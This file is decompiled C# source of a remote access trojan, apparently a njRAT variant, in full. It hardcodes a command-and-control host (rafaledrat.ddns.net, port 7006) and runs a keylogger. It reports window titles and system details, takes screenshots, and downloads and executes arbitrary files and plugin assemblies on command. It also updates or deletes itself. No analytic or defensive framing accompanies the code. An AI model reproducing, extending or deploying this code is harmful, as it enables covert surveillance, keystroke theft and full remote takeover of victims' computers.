using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace Lime;

public class Program
{
	public static string host = "rafaledrat.ddns.net";

	public static string port = "7006";

	public static string registryName = "194a57107ba74a9ea";

	public static string splitter = "@!#&^%$";

	public static string victimName = "TllBTiBDQVQ=";

	public static string version = "0.7NC";

	public static Mutex stubMutex = null;

	public static FileInfo currentAssemblyFileInfo = new FileInfo(Application.get_ExecutablePath());

	public static Keylogger keylogger = null;

	public static bool isConnected = false;

	public static TcpClient tcpSocket = null;

	private static MemoryStream memoryStream = new MemoryStream();

	private static byte[] bytesArray = new byte[5121];

	private static string lastCapturedImage = "";

	public static object currentPlugin = null;

	[CompilerGenerated]
	private static ParameterizedThreadStart _003C_003E9__CachedAnonymousMethodDelegate1;

	[STAThread]
	public static void Main()
	{
		Start();
	}

	public static void Start()
	{
		if (Interaction.Command() != null)
		{
			try
			{
				Registry.CurrentUser.SetValue("di", "!");
			}
			catch
			{
			}
			Thread.Sleep(5000);
		}
		bool createdNew = false;
		stubMutex = new Mutex(initiallyOwned: true, registryName, out createdNew);
		if (!createdNew)
		{
			Environment.Exit(0);
		}
		Thread thread = new Thread(Receive, 1);
		thread.Start();
		try
		{
			keylogger = new Keylogger();
			thread = new Thread(keylogger.WRK, 1);
			thread.Start();
		}
		catch
		{
		}
		int num = 0;
		string text = "";
		while (true)
		{
			Thread.Sleep(1000);
			if (!isConnected)
			{
				text = "";
			}
			Application.DoEvents();
			try
			{
				num = checked(num + 1);
				if (num == 5)
				{
					try
					{
						Process.GetCurrentProcess().MinWorkingSet = (IntPtr)1024;
					}
					catch
					{
					}
				}
				if (num >= 8)
				{
					num = 0;
					string foregroundWindowTitle = GetForegroundWindowTitle();
					if (Operators.CompareString(text, foregroundWindowTitle, false) != 0)
					{
						text = foregroundWindowTitle;
						Send("act" + splitter + foregroundWindowTitle);
					}
				}
			}
			catch
			{
			}
		}
	}

	public static void DeleteValueFromRegistry(string name)
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + registryName, RegistryKeyPermissionCheck.ReadWriteSubTree);
			registryKey.DeleteValue(name);
		}
		catch
		{
		}
	}

	public static object GetValueFromRegistry(string name, object ret)
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\" + registryName, RegistryKeyPermissionCheck.ReadWriteSubTree);
			return registryKey.GetValue(name, RuntimeHelpers.GetObjectValue(ret));
		}
		catch
		{
			return ret;
		}
	}

	public static bool SaveValueOnRegistry(string n, object t, RegistryValueKind typ)
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + registryName, RegistryKeyPermissionCheck.ReadWriteSubTree);
			registryKey.SetValue(n, RuntimeHelpers.GetObjectValue(t));
			return true;
		}
		catch
		{
			return false;
		}
	}

	public static string GetInfo()
	{
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		string text = "ll" + splitter;
		try
		{
			if (Operators.ConditionalCompareObjectEqual(GetValueFromRegistry("vn", ""), (object)"", false))
			{
				string text2 = text;
				string s = Base64ToString(ref victimName) + "_" + GetHWID();
				text = text2 + StringToBase64(ref s) + splitter;
			}
			else
			{
				string text3 = text;
				string s2 = Conversions.ToString(GetValueFromRegistry("vn", ""));
				string s3 = Base64ToString(ref s2) + "_" + GetHWID();
				text = text3 + StringToBase64(ref s3) + splitter;
			}
		}
		catch
		{
			string text4 = text;
			string s4 = GetHWID();
			text = text4 + StringToBase64(ref s4) + splitter;
		}
		try
		{
			text = text + Environment.MachineName + splitter;
		}
		catch
		{
			text = text + "N/A" + splitter;
		}
		try
		{
			text = text + Environment.UserName + splitter;
		}
		catch
		{
			text = text + "N/A" + splitter;
		}
		try
		{
			text = text + currentAssemblyFileInfo.LastWriteTime.Date.ToString("yy-MM-dd") + splitter;
		}
		catch
		{
			text = text + "N/A" + splitter;
		}
		text = text + "" + splitter;
		try
		{
			text += ((ServerComputer)new Computer()).get_Info().get_OSFullName();
		}
		catch
		{
			text += "N/A";
		}
		text += "SP";
		try
		{
			string[] array = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, (CompareMethod)0);
			if (array.Length == 1)
			{
				text += "0";
			}
			text += array[checked(array.Length - 1)];
		}
		catch
		{
			text += "0";
		}
		try
		{
			text = ((!Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86")) ? (text + " x86" + splitter) : (text + " x64" + splitter));
		}
		catch
		{
			text += splitter;
		}
		text = ((!SearchForCam()) ? (text + "No" + splitter) : (text + "Yes" + splitter));
		text = text + version + splitter;
		text = text + ".." + splitter;
		text = text + GetForegroundWindowTitle() + splitter;
		string text5 = "";
		try
		{
			string[] valueNames = Registry.CurrentUser.CreateSubKey("Software\\" + registryName, RegistryKeyPermissionCheck.Default).GetValueNames();
			foreach (string text6 in valueNames)
			{
				if (text6.Length == 32)
				{
					text5 = text5 + text6 + ",";
				}
			}
		}
		catch
		{
		}
		return text + text5;
	}

	public static string StringToBase64(ref string s)
	{
		return Convert.ToBase64String(StringToBytes(ref s));
	}

	public static string Base64ToString(ref string s)
	{
		byte[] B = Convert.FromBase64String(s);
		return BytesToString(ref B);
	}

	public static byte[] StringToBytes(ref string S)
	{
		return Encoding.UTF8.GetBytes(S);
	}

	public static string BytesToString(ref byte[] B)
	{
		return Encoding.UTF8.GetString(B);
	}

	public static byte[] DecompressGzip(byte[] B)
	{
		MemoryStream memoryStream = new MemoryStream(B);
		GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
		byte[] array = new byte[4];
		checked
		{
			memoryStream.Position = memoryStream.Length - 5L;
			memoryStream.Read(array, 0, 4);
			int num = BitConverter.ToInt32(array, 0);
			memoryStream.Position = 0L;
			byte[] array2 = new byte[num - 1 + 1];
			gZipStream.Read(array2, 0, num);
			gZipStream.Dispose();
			memoryStream.Dispose();
			return array2;
		}
	}

	public static bool SearchForCam()
	{
		checked
		{
			try
			{
				int num = 0;
				do
				{
					short wDriver = (short)num;
					string lpszName = Strings.Space(100);
					string lpszVer = null;
					if (!capGetDriverDescriptionA(wDriver, ref lpszName, 100, ref lpszVer, 100))
					{
						num++;
						continue;
					}
					return true;
				}
				while (num <= 4);
			}
			catch
			{
			}
			return false;
		}
	}

	public static string GetForegroundWindowTitle()
	{
		try
		{
			IntPtr foregroundWindow = GetForegroundWindow();
			if (foregroundWindow == IntPtr.Zero)
			{
				return "";
			}
			string WinTitle = Strings.Space(checked(GetWindowTextLengthA((long)foregroundWindow) + 1));
			GetWindowTextA(foregroundWindow, ref WinTitle, WinTitle.Length);
			return StringToBase64(ref WinTitle);
		}
		catch
		{
			return "";
		}
	}

	public static string GetHWID()
	{
		try
		{
			string lpRootPathName = Interaction.Environ("SystemDrive") + "\\";
			string lpVolumeNameBuffer = null;
			int lpMaximumComponentLength = 0;
			int lpFileSystemFlags = 0;
			string lpFileSystemNameBuffer = null;
			int lpVolumeSerialNumber = 0;
			GetVolumeInformationA(ref lpRootPathName, ref lpVolumeNameBuffer, 0, ref lpVolumeSerialNumber, ref lpMaximumComponentLength, ref lpFileSystemFlags, ref lpFileSystemNameBuffer, 0);
			return Conversion.Hex(lpVolumeSerialNumber);
		}
		catch
		{
			return "ERR";
		}
	}

	public static object Plugin(byte[] b, string c)
	{
		Module[] modules = Assembly.Load(b).GetModules();
		foreach (Module module in modules)
		{
			Type[] types = module.GetTypes();
			foreach (Type type in types)
			{
				if (type.FullName!.EndsWith("." + c))
				{
					return module.Assembly.CreateInstance(type.FullName);
				}
			}
		}
		return null;
	}

	public static void Uninstall()
	{
		try
		{
			Registry.CurrentUser.OpenSubKey("Software", writable: true)!.DeleteSubKeyTree(registryName);
		}
		catch
		{
		}
		try
		{
			Interaction.Shell("cmd.exe /C Y /N /D Y /T 1 & Del \"" + currentAssemblyFileInfo.FullName + "\"", (AppWinStyle)0, false, -1);
		}
		catch
		{
		}
		try
		{
			stubMutex.Close();
		}
		catch
		{
		}
		Environment.Exit(0);
	}

	public static void HandleData(byte[] b)
	{
		//IL_0677: Unknown result type (might be due to invalid IL or missing references)
		//IL_067e: Expected O, but got Unknown
		//IL_070e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0715: Expected O, but got Unknown
		string[] array = Strings.Split(BytesToString(ref b), splitter, -1, (CompareMethod)0);
		checked
		{
			try
			{
				switch (array[0])
				{
				case "ll":
					isConnected = false;
					break;
				case "kl":
					Send("kl" + splitter + StringToBase64(ref keylogger.Logs));
					break;
				case "prof":
					switch (array[1])
					{
					case "~":
						SaveValueOnRegistry(array[2], array[3], RegistryValueKind.String);
						break;
					case "!":
						SaveValueOnRegistry(array[2], array[3], RegistryValueKind.String);
						Send(Conversions.ToString(Operators.ConcatenateObject((object)("getvalue" + splitter + array[1] + splitter), GetValueFromRegistry(array[1], ""))));
						break;
					case "@":
						DeleteValueFromRegistry(array[2]);
						break;
					}
					break;
				case "rn":
				{
					byte[] bytes;
					if (array[2][0] == '\u001f')
					{
						try
						{
							MemoryStream memoryStream5 = new MemoryStream();
							int length3 = (array[0] + splitter + array[1] + splitter).Length;
							memoryStream5.Write(b, length3, b.Length - length3);
							bytes = DecompressGzip(memoryStream5.ToArray());
						}
						catch
						{
							Send("MSG" + splitter + "Execute ERROR");
							Send("bla");
							break;
						}
					}
					else
					{
						WebClient webClient2 = new WebClient();
						try
						{
							bytes = webClient2.DownloadData(array[2]);
						}
						catch
						{
							Send("MSG" + splitter + "Download ERROR");
							Send("bla");
							break;
						}
					}
					Send("bla");
					string text4 = Path.GetTempFileName() + "." + array[1];
					try
					{
						File.WriteAllBytes(text4, bytes);
						Process.Start(text4);
						Send("MSG" + splitter + "Executed As " + new FileInfo(text4).Name);
						break;
					}
					catch (Exception ex2)
					{
						Send("MSG" + splitter + "Execute ERROR " + ex2.Message);
						ProjectData.ClearProjectError();
						break;
					}
				}
				case "inv":
				{
					byte[] array11 = (byte[])GetValueFromRegistry(array[1], new byte[0]);
					if ((array[3].Length < 10) & (array11.Length == 0))
					{
						Send("pl" + splitter + array[1] + splitter + Conversions.ToString(1));
						break;
					}
					if (array[3].Length > 10)
					{
						MemoryStream memoryStream7 = new MemoryStream();
						int length5 = (array[0] + splitter + array[1] + splitter + array[2] + splitter).Length;
						memoryStream7.Write(b, length5, b.Length - length5);
						array11 = DecompressGzip(memoryStream7.ToArray());
						SaveValueOnRegistry(array[1], array11, RegistryValueKind.Binary);
					}
					Send("pl" + splitter + array[1] + splitter + Conversions.ToString(0));
					object objectValue2 = RuntimeHelpers.GetObjectValue(Plugin(array11, "A"));
					NewLateBinding.LateSet(objectValue2, (Type)null, "h", new object[1] { host }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(objectValue2, (Type)null, "p", new object[1] { port }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(objectValue2, (Type)null, "osk", new object[1] { array[2] }, (string[])null, (Type[])null);
					NewLateBinding.LateCall(objectValue2, (Type)null, "start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					while (!Conversions.ToBoolean(Operators.OrObject((object)(!isConnected), Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue2, (Type)null, "Off", new object[0], (string[])null, (Type[])null, (bool[])null), (object)true, false))))
					{
						Thread.Sleep(1);
					}
					NewLateBinding.LateSet(objectValue2, (Type)null, "off", new object[1] { true }, (string[])null, (Type[])null);
					break;
				}
				case "ret":
				{
					byte[] array8 = (byte[])GetValueFromRegistry(array[1], new byte[0]);
					if ((array[2].Length < 10) & (array8.Length == 0))
					{
						Send("pl" + splitter + array[1] + splitter + Conversions.ToString(1));
						break;
					}
					if (array[2].Length > 10)
					{
						MemoryStream memoryStream6 = new MemoryStream();
						int length4 = (array[0] + splitter + array[1] + splitter).Length;
						memoryStream6.Write(b, length4, b.Length - length4);
						array8 = DecompressGzip(memoryStream6.ToArray());
						SaveValueOnRegistry(array[1], array8, RegistryValueKind.Binary);
					}
					Send("pl" + splitter + array[1] + splitter + Conversions.ToString(0));
					object objectValue = RuntimeHelpers.GetObjectValue(Plugin(array8, "A"));
					string[] array9 = new string[5]
					{
						"ret",
						splitter,
						array[1],
						splitter,
						null
					};
					string[] array10 = array9;
					string s = Conversions.ToString(NewLateBinding.LateGet(objectValue, (Type)null, "GT", new object[0], (string[])null, (Type[])null, (bool[])null));
					array10[4] = StringToBase64(ref s);
					Send(string.Concat(array9));
					break;
				}
				case "CAP":
				{
					int width = Screen.get_PrimaryScreen().get_Bounds().Width;
					Bitmap val = new Bitmap(width, Screen.get_PrimaryScreen().get_Bounds().Height, (PixelFormat)135173);
					Graphics val2 = Graphics.FromImage((Image)(object)val);
					Graphics val3 = val2;
					Size size = new Size(((Image)val).get_Width(), ((Image)val).get_Height());
					val3.CopyFromScreen(0, 0, 0, 0, size, (CopyPixelOperation)13369376);
					try
					{
						Cursor @default = Cursors.get_Default();
						Graphics val4 = val2;
						Point position = Cursor.get_Position();
						size = new Size(32, 32);
						Rectangle rectangle = new Rectangle(position, size);
						@default.Draw(val4, rectangle);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					val2.Dispose();
					Bitmap val5 = new Bitmap(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
					val2 = Graphics.FromImage((Image)(object)val5);
					val2.DrawImage((Image)(object)val, 0, 0, ((Image)val5).get_Width(), ((Image)val5).get_Height());
					val2.Dispose();
					MemoryStream memoryStream2 = new MemoryStream();
					string S = "CAP" + splitter;
					b = StringToBytes(ref S);
					memoryStream2.Write(b, 0, b.Length);
					MemoryStream memoryStream3 = new MemoryStream();
					((Image)val5).Save((Stream)memoryStream3, ImageFormat.get_Jpeg());
					string text2 = CreateHash(memoryStream3.ToArray());
					if (Operators.CompareString(text2, lastCapturedImage, false) != 0)
					{
						lastCapturedImage = text2;
						memoryStream2.Write(memoryStream3.ToArray(), 0, (int)memoryStream3.Length);
					}
					else
					{
						memoryStream2.WriteByte(0);
					}
					Send(memoryStream2.ToArray());
					memoryStream2.Dispose();
					memoryStream3.Dispose();
					((Image)val).Dispose();
					((Image)val5).Dispose();
					break;
				}
				case "un":
					switch (array[1])
					{
					case "~":
						Uninstall();
						break;
					case "!":
						try
						{
							stubMutex.Close();
						}
						catch
						{
						}
						Environment.Exit(0);
						break;
					case "@":
						Process.Start(currentAssemblyFileInfo.FullName);
						try
						{
							stubMutex.Close();
						}
						catch
						{
						}
						Environment.Exit(0);
						break;
					}
					break;
				case "up":
				{
					byte[] array7 = null;
					if (array[1][0] == '\u001f')
					{
						try
						{
							MemoryStream memoryStream4 = new MemoryStream();
							int length2 = (array[0] + splitter).Length;
							memoryStream4.Write(b, length2, b.Length - length2);
							array7 = DecompressGzip(memoryStream4.ToArray());
						}
						catch
						{
							Send("MSG" + splitter + "Update ERROR");
							Send("bla");
							break;
						}
					}
					else
					{
						WebClient webClient = new WebClient();
						try
						{
							array7 = webClient.DownloadData(array[1]);
						}
						catch
						{
							Send("MSG" + splitter + "Update ERROR");
							Send("bla");
							break;
						}
					}
					Send("bla");
					string text3 = Path.GetTempFileName() + ".exe";
					try
					{
						Send("MSG" + splitter + "Updating To " + new FileInfo(text3).Name);
						Thread.Sleep(2000);
						File.WriteAllBytes(text3, array7);
						Process.Start(text3, "..");
					}
					catch (Exception ex)
					{
						Send("MSG" + splitter + "Update ERROR " + ex.Message);
						break;
					}
					Uninstall();
					break;
				}
				case "Ex":
				{
					if (currentPlugin == null)
					{
						Send("PLG");
						int num = 0;
						while (!(unchecked(currentPlugin != null || num == 20) | !isConnected))
						{
							num++;
							Thread.Sleep(1000);
						}
						if ((currentPlugin == null) | !isConnected)
						{
							break;
						}
					}
					object obj = currentPlugin;
					Type type = null;
					string text = "ind";
					object[] array2 = new object[1] { b };
					object[] array3 = array2;
					string[] array4 = null;
					Type[] array5 = null;
					bool[] array6 = new bool[1] { true };
					NewLateBinding.LateCall(obj, type, text, array3, array4, array5, array6, true);
					if (array6[0])
					{
						b = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(byte[]));
					}
					break;
				}
				case "PLG":
				{
					MemoryStream memoryStream = new MemoryStream();
					int length = (array[0] + splitter).Length;
					memoryStream.Write(b, length, b.Length - length);
					currentPlugin = RuntimeHelpers.GetObjectValue(Plugin(DecompressGzip(memoryStream.ToArray()), "A"));
					NewLateBinding.LateSet(currentPlugin, (Type)null, "H", new object[1] { host }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(currentPlugin, (Type)null, "P", new object[1] { port }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(currentPlugin, (Type)null, "c", new object[1] { tcpSocket }, (string[])null, (Type[])null);
					break;
				}
				}
			}
			catch (Exception ex3)
			{
				if (array.Length > 0 && ((Operators.CompareString(array[0], "Ex", false) == 0) | (Operators.CompareString(array[0], "PLG", false) == 0)))
				{
					currentPlugin = null;
				}
				try
				{
					Send("ER" + splitter + array[0] + splitter + ex3.Message);
				}
				catch
				{
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	public static string CreateHash(byte[] B)
	{
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		B = mD5CryptoServiceProvider.ComputeHash(B);
		string text = "";
		byte[] array = B;
		foreach (byte b in array)
		{
			text += b.ToString("x2");
		}
		return text;
	}

	public static bool Send(byte[] b)
	{
		if (!isConnected)
		{
			return false;
		}
		try
		{
			FileInfo fileInfo = currentAssemblyFileInfo;
			lock (fileInfo)
			{
				if (!isConnected)
				{
					return false;
				}
				MemoryStream memoryStream = new MemoryStream();
				string S = b.Length + "\0";
				byte[] array = StringToBytes(ref S);
				memoryStream.Write(array, 0, array.Length);
				memoryStream.Write(b, 0, b.Length);
				tcpSocket.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
				memoryStream.Dispose();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			try
			{
				if (isConnected)
				{
					isConnected = false;
					tcpSocket.Close();
				}
			}
			catch
			{
			}
			ProjectData.ClearProjectError();
		}
		return isConnected;
	}

	public static bool Send(string S)
	{
		return Send(StringToBytes(ref S));
	}

	public static bool Connect()
	{
		isConnected = false;
		Thread.Sleep(2000);
		FileInfo fileInfo = currentAssemblyFileInfo;
		lock (fileInfo)
		{
			try
			{
				if (tcpSocket != null)
				{
					try
					{
						tcpSocket.Close();
						tcpSocket = null;
					}
					catch
					{
					}
				}
				try
				{
					memoryStream.Dispose();
				}
				catch
				{
				}
			}
			catch
			{
			}
			try
			{
				memoryStream = new MemoryStream();
				tcpSocket = new TcpClient();
				tcpSocket.ReceiveBufferSize = 204800;
				tcpSocket.SendBufferSize = 204800;
				tcpSocket.Client.SendTimeout = 10000;
				tcpSocket.Client.ReceiveTimeout = 10000;
				tcpSocket.Connect(host, Conversions.ToInteger(port));
				isConnected = true;
				Send(GetInfo());
				try
				{
					string empty = string.Empty;
					if (Operators.ConditionalCompareObjectEqual(GetValueFromRegistry("vn", ""), (object)"", false))
					{
						empty = empty + Base64ToString(ref victimName) + "\r\n";
					}
					else
					{
						string text = empty;
						string s = Conversions.ToString(GetValueFromRegistry("vn", ""));
						empty = text + Base64ToString(ref s) + "\r\n";
					}
					empty = empty + host + ":" + port + "\r\n";
					empty = string.Concat(empty, currentAssemblyFileInfo.Directory, "\r\n");
					empty = empty + currentAssemblyFileInfo.Name + "\r\n";
					empty += "\r\n";
					empty += "\r\n";
					empty += "\r\n";
					empty += "";
					Send("inf" + splitter + StringToBase64(ref empty));
				}
				catch
				{
				}
			}
			catch
			{
				isConnected = false;
			}
		}
		return isConnected;
	}

	public static void Receive()
	{
		checked
		{
			while (true)
			{
				lastCapturedImage = "";
				if (tcpSocket != null)
				{
					long num = -1L;
					int num2 = 0;
					try
					{
						while (true)
						{
							IL_0058:
							num2++;
							if (num2 == 10)
							{
								num2 = 0;
								Thread.Sleep(1);
							}
							if (!isConnected)
							{
								break;
							}
							if (tcpSocket.Available < 1)
							{
								tcpSocket.Client.Poll(-1, SelectMode.SelectRead);
							}
							while (tcpSocket.Available != 0)
							{
								if (num == -1L)
								{
									string text = "";
									while (true)
									{
										int num3 = tcpSocket.GetStream().ReadByte();
										switch (num3)
										{
										case 0:
											num = Conversions.ToLong(text);
											if (num == 0L)
											{
												Send("");
												num = -1L;
											}
											if (tcpSocket.Available <= 0)
											{
												goto IL_0058;
											}
											goto IL_012c;
										case -1:
											goto end_IL_00d8;
										}
										text += Conversions.ToString(Conversions.ToInteger(Strings.ChrW(num3).ToString()));
										continue;
										end_IL_00d8:
										break;
									}
									break;
								}
								bytesArray = new byte[tcpSocket.Available + 1];
								long num4 = num - memoryStream.Length;
								if (bytesArray.Length > num4)
								{
									bytesArray = new byte[(int)(num4 - 1L) + 1];
								}
								int count = tcpSocket.Client.Receive(bytesArray, 0, bytesArray.Length, SocketFlags.None);
								memoryStream.Write(bytesArray, 0, count);
								if (memoryStream.Length == num)
								{
									num = -1L;
									Thread thread = new Thread(delegate(object a0)
									{
										HandleData((byte[])a0);
									}, 1);
									thread.Start(memoryStream.ToArray());
									thread.Join(100);
									memoryStream.Dispose();
									memoryStream = new MemoryStream();
								}
								goto IL_0058;
								IL_012c:;
							}
							break;
						}
					}
					catch
					{
					}
				}
				do
				{
					try
					{
						if (currentPlugin != null)
						{
							NewLateBinding.LateCall(currentPlugin, (Type)null, "clear", new object[0], (string[])null, (Type[])null, (bool[])null, true);
							currentPlugin = null;
						}
					}
					catch
					{
					}
					isConnected = false;
				}
				while (!Connect());
				isConnected = true;
			}
		}
	}

	[DllImport("ntdll")]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer, int nVolumeNameSize, ref int lpVolumeSerialNumber, ref int lpMaximumComponentLength, ref int lpFileSystemFlags, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer, int nFileSystemNameSize);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextLengthA(long hwnd);
}
